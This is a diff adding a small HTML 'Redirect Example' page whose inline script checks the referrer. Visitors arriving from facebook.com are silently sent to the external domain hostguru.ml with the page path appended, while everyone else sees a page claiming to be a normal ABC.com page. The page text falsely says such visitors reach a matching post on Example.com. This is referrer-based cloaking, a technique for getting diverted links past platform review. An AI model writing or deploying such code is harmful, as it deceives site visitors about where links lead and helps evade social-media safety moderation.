@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Redirect Example</title>
+</head>
+<body>
+
+	<!-- Place this script in the <head> section of your HTML file -->
+	<script>
+		var referrer = document.referrer;
+		if (referrer.includes("facebook.com")) {
+			var slug = window.location.pathname;
+			window.location.href = "https://hostguru.ml/" + slug;
+		}
+	</script>
+
+	<!-- Normal page content goes here -->
+	<h1>Welcome to ABC.com!</h1>
+	<p>This is a normal page. If you came from Facebook and entered a WordPress post slug, you will be redirected to the corresponding post on Example.com</p>
+
+</body>
+</html>
